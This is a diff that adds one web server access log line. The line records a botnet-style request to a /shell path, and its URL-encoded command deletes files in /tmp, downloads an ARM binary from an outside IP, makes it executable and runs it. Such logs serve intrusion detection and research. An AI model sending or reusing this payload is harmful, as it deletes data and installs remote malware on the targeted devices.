@@ -1,0 +1,1 @@
+177.126.143.219 - - [01/Mar/2020:08:50:26 +0200] "GET /shell?cd+/tmp;+rm+-rf+*;+wget+http://45.148.10.194/arm7;+chmod+777+arm7;+./arm7+rep.arm7 HTTP/1.0" 301 162 "-" "-" "botnet/2.0"
